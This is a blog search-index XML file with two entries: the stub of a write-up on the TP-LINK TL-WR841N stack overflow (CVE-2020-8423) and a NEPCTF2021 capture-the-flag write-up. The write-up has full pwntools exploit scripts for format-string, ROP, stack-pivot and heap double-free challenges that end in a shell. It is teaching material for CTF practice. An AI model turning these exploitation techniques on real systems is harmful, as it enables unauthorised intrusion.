<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020-8423TL-WR841N栈溢出复现</title>
      <link href="archives/e77640bd/"/>
      <url>archives/e77640bd/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>漏洞编号：CVE-2020-8423</p><p>漏洞设备：TP-LINK TL-WR841N V10</p><p>漏洞效果：登陆过路由器web服务admin账户之后可以获取到路由器的shell。</p><p>漏洞描述：httpd获取参数时的栈溢出导致了覆盖返回地址shellcode执行</p><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><h3 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h3>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TPLink </tag>
            
            <tag> TL-WR841N </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NEPCTF2021 Writeup</title>
      <link href="archives/bdb75c49/"/>
      <url>archives/bdb75c49/</url>
      
        <content type="html"><![CDATA[<h2 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h2><p>main 函数退出时会调用 buf[2] 里面的函数：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321215907.png" alt="image-20210321215903208"></p><p>调试看到里面存在的值，是众多错误提示中的一个：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321220336.png" alt="image-20210321220334619"></p><p>程序存在后门，地址为：0x14E1</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321220646.png" alt="image-20210321220645329"></p><p>由于开启了 PIE 保护，只有最后3位不变，需要爆破倒数第 4 位。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/bin/cat /flag&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">&quot;\xe1\xa4&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p = process(<span class="string">&quot;./xhh&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0x1721)&quot;)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">flag = p.recv()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">log.info(<span class="string">&quot;flag:&quot;</span>+flag)</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.close()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h2 id="scmt"><a href="#scmt" class="headerlink" title="scmt"></a>scmt</h2><p>格式化字符串泄露 token ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321221114.png" alt="image-20210321221113130"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./scmt&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">37597</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x400B32&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;skye%8$p&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;skye&quot;</span>)</span><br><span class="line">token = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;token:&quot;</span>+<span class="built_in">hex</span>(token))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;number:\n&quot;</span>)</span><br><span class="line">payload = <span class="built_in">str</span>(token)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h2><p>以当前时间设置随机种子：<code>srand(time)</code> ，输入与生成随机数相同 getshell ，那个 scanf 溢出没用到</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321221625.png" alt="image-20210321221607148"></p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><p>不会写 python 随机数生成，曲线救国了一下：</p><ol><li><p>用 python 获取<strong>当前时间+ 1min</strong> 的时间戳</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#filename:get_timecode.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">int</span>(time.time())+<span class="number">60</span><span class="comment">#timecode</span></span><br></pre></td></tr></table></figure></li><li><p>用 c 设置随机种子并生成随机数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#filename:time_random.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    srand(<span class="number">1616233265</span>);<span class="comment">//timecode</span></span><br><span class="line">    a = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">648729124</span>)<span class="comment">#time_random</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment"># p = process(&quot;./easystack&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">39669</span>)</span><br><span class="line"><span class="comment"># p.recvuntil(&quot;!!\n&quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">flag = p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">print(flag)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.close()</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p>输入 name 有一个 sprintf 存在格式化字符串漏洞：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210323225324.png" alt="image-20210323225253144"></p><p>修改 main 函数的 rbp 最后一个字节为 <code>\x00</code> ，也可以其他，对齐 0x8 就行。有几率刚好撞上 main 函数中输入的 teamname ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210323225541.png" alt="image-20210323225539892"></p><p>由于 teamname 长度限制需要先栈迁移再泄露 libc &amp; 写入下一步 ROP 。</p><p>迁移后泄露地址，有了 libc 地址，构造 getshell 。尝试 system(‘/bin/sh’) 报错，用 onegadget 可以。</p><p>人品极差就会卡在奇奇怪怪地方循环，或者直接崩掉</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210323231612.png" alt="easypwn循环"></p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./easypwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./easypwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400be3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400be1</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x00000000004007c8</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a1f</span></span><br><span class="line">bss = <span class="number">0x602080</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;teamname: &quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x400940&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x400AE8&quot;)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss+<span class="number">0x350</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(bss+<span class="number">0x350</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27;*0x50</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;%22$hhn&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;introduction\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.4</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss+<span class="number">0x250</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(bss+<span class="number">0x250</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_addr = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_str = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(pop_rdi_ret) + p64(binsh_str)</span></span><br><span class="line"><span class="comment"># payload += p64(system_addr)</span></span><br><span class="line"></span><br><span class="line">payload = p64(libc_base + <span class="number">0x4f432</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="sooooeasy"><a href="#sooooeasy" class="headerlink" title="sooooeasy"></a>sooooeasy</h2><p>libc2.23 uaf 没有输出功能。攻击 _IO_2_1_stdout 结构体来实现 libc 地址泄露：通过低字节覆盖 unsorted bin 留下的 main_arena 指针，再加以爆破 4 位，就能分配到 _IO_2_1_stdout ，通过篡改 _IO_2_1_stdout 的 flags 为 0x0FBAD1887 ，_IO_write_base 低字节覆盖，然后当程序调用 puts 输出任意信息时，就会输出 _IO_write_base 到 _IO_write_ptr 之间的数据，而这之间就有 libc 的指针。</p><blockquote><p>劫持 stdout 泄露 libc 地址方法原理：</p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105590591">https://blog.csdn.net/seaaseesa/article/details/105590591</a></p><p><a href="http://blog.eonew.cn/archives/1190">http://blog.eonew.cn/archives/1190</a></p></blockquote><h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><p>一开始又遇到堆数量达到上限，可以调整减少堆数量，官网 wp 通过释放两次同一个堆触发 malloc_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,message</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message:\n&quot;</span>)</span><br><span class="line">p.sendline(message)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsortedbin 写入 main_arena 指针</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入爆破地址，这里爆破的是stdout上面的_IO_wide_data_2，利用偏移构造出fastbin size位</span></span><br><span class="line">_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">add(<span class="number">0x68</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>)),<span class="string">&#x27;g&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment"># add(0x60,p16(0x25dd),&#x27;g&#x27;*8)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin double free</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,p8(<span class="number">0</span>),<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p8(<span class="number">0</span>),<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p8(<span class="number">0</span>),<span class="string">&#x27;3&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p8(<span class="number">0</span>),<span class="string">&#x27;4&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack stdout</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x33</span> + p64(<span class="number">0x0FBAD1887</span>) +p64(<span class="number">0</span>)*<span class="number">3</span> + p8(<span class="number">0x88</span>)</span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdin_ = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;_IO_2_1_stdin_:&quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdin_))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;message:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base = _IO_2_1_stdin_ - libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line">onegadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># fastbin double free</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(onegadget)+p64(realloc+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">p = process(<span class="string">&quot;./sooooeasy&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn()</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br><span class="line">p = process(<span class="string">&quot;./sooooeasy&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://blog.eonew.cn/archives/1190">利用 <em>IO_2_1_stdout</em> 泄露信息</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105590591">glibc从堆任意分配到攻击IO流达到泄露信息&amp;realloc特性&amp;unsorted bin expand总结</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> NEPCTF </tag>
            
            <tag> 劫持stdout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
